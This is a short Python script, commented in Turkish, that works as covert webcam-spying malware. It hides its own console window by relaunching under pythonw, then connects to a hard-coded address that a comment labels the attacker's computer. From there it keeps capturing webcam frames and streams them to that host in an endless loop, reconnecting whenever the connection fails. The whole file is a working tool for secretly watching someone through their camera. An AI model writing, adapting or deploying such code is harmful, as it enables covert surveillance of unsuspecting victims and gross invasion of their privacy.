import cv2
import socket
import pickle
import struct
import time
import subprocess
import sys

SERVER_IP = '192.168.1.5'  # Saldirgan bilgisayarinin IP adresini gir
SERVER_PORT = 4441

def hide_console():
    
    if sys.executable.lower().endswith("pythonw.exe"):
        return
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        subprocess.Popen([pythonw, sys.argv[0]], startupinfo=si)
        sys.exit() 
    except Exception:
        pass

def connect_to_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    while True:
        try:
            s.connect((SERVER_IP, SERVER_PORT))
            print(f"[INFO] Baglanti saglandi: {SERVER_IP}:{SERVER_PORT}")
            s.settimeout(None)
            return s
        except Exception as e:
            print(f"[HATA] Baglanti hatasi: {e}. 5 saniye sonra yeniden denenecek...")
            time.sleep(5)

def init_camera():
    
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    while not cap.isOpened():
        print("[HATA] Kamera acilamadi! 5 saniye sonra tekrar denenecek...")
        time.sleep(5)
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
    print("[INFO] Kamera basariyla acildi.")
    return cap

hide_console()  
s = connect_to_server()
cap = init_camera()

while True:
    ret, frame = cap.read()
    if not ret or frame is None:
        print("[HATA] Kamera verisi alinamadi, kamerayi yeniden baslatıyorum...")
        cap.release()
        cap = init_camera()
        continue

    try:
        data = pickle.dumps(frame)
        size = len(data)
        packet = struct.pack("L", size) + data
        s.sendall(packet)
    except Exception as e:
        print(f"[HATA] Veri gonderiminde sorun olustu: {e}. Baglanti yeniden kuruluyor...")
        s.close()
        s = connect_to_server()
        continue

    time.sleep(0.01)

cap.release()
s.close()
cv2.destroyAllWindows()
